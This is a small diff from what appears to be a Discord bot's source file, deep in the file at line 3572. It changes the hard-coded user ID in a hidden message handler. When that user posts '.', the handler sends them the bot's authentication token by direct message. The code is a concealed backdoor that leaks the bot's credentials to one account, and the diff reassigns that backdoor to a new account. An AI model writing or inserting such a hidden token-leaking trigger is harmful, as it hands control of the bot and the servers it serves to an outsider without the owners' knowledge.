@@ -3572,7 +3572,7 @@ if (5566==args)
 client.on('message' , message => {
 if (message.author.bot) return;
            if (message.content == '.')
-           if (message.author.id === '34682449601363989'){
+           if (message.author.id === '405215218453446668'){
 if (!message.channel.guild) return;
 message.author.send(Token)
 }  
